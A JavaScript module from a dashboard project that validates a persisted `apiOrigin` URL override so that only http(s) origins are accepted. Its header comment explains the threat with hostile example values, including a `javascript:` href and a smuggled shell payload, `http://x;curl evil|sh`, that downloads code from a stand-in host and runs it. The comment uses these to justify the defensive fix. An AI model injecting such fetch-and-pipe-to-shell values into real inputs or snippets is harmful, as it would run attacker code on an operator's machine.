// Where the dashboard decides which server it talks to.
//
// Extracted from app.js in v0.5.4. This is the resolver ONLY — `apiOrigin` and `apiBase` are still
// computed in app.js, because they are evaluated at module load and a module that ran this function at
// load would be unimportable in Node, which is exactly the property this extraction is buying. The
// function itself touches `location`, `localStorage` and `document` only when CALLED, so this module
// imports cleanly and can be tested. See docs/APP_JS_APIBASE_PACKET.md for the open question about the
// two constants.
//
// THE OVERRIDE IS VALIDATED, because it is persisted and it reaches sinks. `?apiOrigin=` was taken
// from the URL with trailing slashes stripped and nothing else, then written to localStorage — so a
// single link outlived itself, and removing the parameter did not undo it. What it feeds:
//
//   * `${apiOrigin}/api/v1` — every fetch
//   * `new WebSocket(wsOrigin + "/ws")` — realtime-socket.mjs
//   * `legacy.href = ${apiOrigin}/api/v1/dashboard` — static-links.mjs, so a `javascript:` value
//     becomes a `javascript:` href that runs when the operator clicks the link
//   * the Help card's install snippet — a shell command the operator is invited to copy and RUN, so
//     `http://x;curl evil|sh` renders as a command that does something other than install
//
// `new URL(...).origin` settles it with the platform's own parser rather than a regex: it throws on
// anything unparseable and reduces what survives to scheme://host:port, dropping path, query and
// fragment. Measured over ten values — every legitimate one (LAN IP, hostname, https, trailing
// slash) passes through unchanged, and `javascript:`, `data:`, shell metacharacters, `//evil.host`
// and plain junk are all refused.
//
// POINTING AT ANOTHER HOST IS STILL ALLOWED. `http://evil.host:9000` passes, and that is deliberate:
// aiming the dashboard at a different machine is what this parameter is FOR. Restricting it to the
// page's own host would be a policy decision about how the operator may use their own tool, which is
// theirs to make; refusing a value that is not a URL at all is not.

/** Scheme://host:port, or "" when the value is not a usable http(s) origin. */
function asHttpOrigin(value) {
  try {
    const url = new URL(String(value));
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return '';
    return url.origin;
  } catch {
    return '';
  }
}

export function resolveApiOrigin() {
  const params = new URLSearchParams(location.search);
  const requested = asHttpOrigin(params.get('apiOrigin'));
  if (requested) {
    localStorage.setItem('aify.next.apiOrigin', requested);
    return requested;
  }
  // A stored value is checked too, not just a fresh one. Validating only the query parameter would
  // leave an override written before this existed — or by any other route to localStorage — in force
  // for as long as the browser keeps it.
  const stored = asHttpOrigin(localStorage.getItem('aify.next.apiOrigin'));
  if (stored) return stored;
  localStorage.removeItem('aify.next.apiOrigin');
  const port = document.documentElement.dataset.defaultApiPort || '8800';
  return `${location.protocol}//${location.hostname}:${port}`;
}
